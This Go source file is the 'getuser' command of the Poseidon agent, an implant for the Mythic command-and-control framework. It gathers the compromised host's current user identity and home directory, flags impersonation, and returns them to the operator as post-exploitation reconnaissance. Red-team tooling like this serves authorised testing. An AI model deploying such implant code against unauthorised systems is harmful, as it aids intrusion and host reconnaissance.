package getuser

import (
	// Standard
	"encoding/json"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"os/user"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type SerializableUser struct {
	// Uid is the user ID.
	// On POSIX systems, this is a decimal number representing the uid.
	// On Windows, this is a security identifier (SID) in a string format.
	// On Plan 9, this is the contents of /dev/user.
	Uid string
	// Gid is the primary group ID.
	// On POSIX systems, this is a decimal number representing the gid.
	// On Windows, this is a SID in a string format.
	// On Plan 9, this is the contents of /dev/user.
	Gid string
	// Username is the login name.
	Username string
	// Name is the user's real or display name.
	// It might be blank.
	// On POSIX systems, this is the first (or only) entry in the GECOS field
	// list.
	// On Windows, this is the user's display name.
	// On Plan 9, this is the contents of /dev/user.
	Name string
	// HomeDir is the path to the user's home directory (if they have one).
	HomeDir string
}

func (e SerializableUser) MarshalJSON() ([]byte, error) {
	alias := map[string]interface{}{
		"uid":      e.Uid,
		"gid":      e.Gid,
		"username": e.Username,
		"name":     e.Name,
		"homedir":  e.HomeDir,
	}
	return json.Marshal(&alias)
}

// Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := task.NewResponse()

	curUser, err := user.Current()

	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	serUser := SerializableUser{
		Uid:      curUser.Uid,
		Gid:      curUser.Gid,
		Username: curUser.Username,
		Name:     curUser.Name,
		HomeDir:  curUser.HomeDir,
	}

	res, err := json.MarshalIndent(serUser, "", "    ")

	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	msg.UserOutput = string(res)
	msg.Completed = true
	effectiveUser := functions.GetEffectiveUser()
	if effectiveUser != functions.GetUser() {
		callbackUpdate := structs.CallbackUpdate{
			ImpersonationContext: &effectiveUser,
		}
		msg.CallbackUpdate = &callbackUpdate
	}
	task.Job.SendResponses <- msg
	return
}
